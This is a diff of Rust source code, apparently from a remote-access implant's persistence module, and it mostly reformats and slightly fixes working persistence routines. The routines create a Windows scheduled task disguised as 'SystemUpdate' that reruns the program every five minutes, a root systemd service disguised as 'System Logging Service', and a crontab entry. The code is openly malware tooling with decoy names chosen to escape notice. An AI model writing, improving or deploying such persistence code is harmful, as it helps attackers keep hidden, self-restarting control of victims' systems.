@@ -27,9 +27,22 @@ fn install_windows_persistence() -> String {
     let exe = std::env::current_exe().unwrap();
     let username = whoami::username();
 
+    let quoted_tr = format!("\"{}\"", exe.to_str().unwrap());
     let result = Command::new("schtasks")
-        .args(&["/create", "/sc", "minute", "/mo", "5", "/tn", "SystemUpdate",
-                "/tr", exe.to_str().unwrap(), "/ru", &username, "/f"])
+        .args(&[
+            "/create",
+            "/sc",
+            "minute",
+            "/mo",
+            "5",
+            "/tn",
+            "SystemUpdate",
+            "/tr",
+            &quoted_tr,
+            "/ru",
+            &username,
+            "/f",
+        ])
         .output();
 
     match result {
@@ -82,7 +95,7 @@ fn install_systemd_service() -> Result<String, String> {
     let exe = std::env::current_exe().map_err(|e| e.to_string())?;
 
     let service_content = format!(
-r#"[Unit]
+        r#"[Unit]
 Description=System Logging Service
 After=network.target
 
@@ -94,7 +107,9 @@ RestartSec=10
 
 [Install]
 WantedBy=multi-user.target
-"#, exe.display());
+"#,
+        exe.display()
+    );
 
     std::fs::write("/etc/systemd/system/systemd-log.service", service_content)
         .map_err(|e| e.to_string())?;
@@ -169,7 +184,10 @@ fn install_crontab() -> String {
     };
 
     let result = Command::new("sh")
-        .args(&["-c", &format!("echo '{}' | crontab -", new_crontab.replace("'", "'\\''"))])
+        .args(&[
+            "-c",
+            &format!("echo '{}' | crontab -", new_crontab.replace("'", "'\\''")),
+        ])
         .output();
 
     match result {
@@ -200,10 +218,7 @@ fn uninstall_crontab() -> String {
         .join("\n");
 
     if new_crontab.is_empty() {
-        Command::new("crontab")
-            .args(&["-r"])
-            .output()
-            .ok();
+        Command::new("crontab").args(&["-r"]).output().ok();
     } else {
         Command::new("sh")
             .args(&["-c", &format!("echo '{}' | crontab -", new_crontab)])
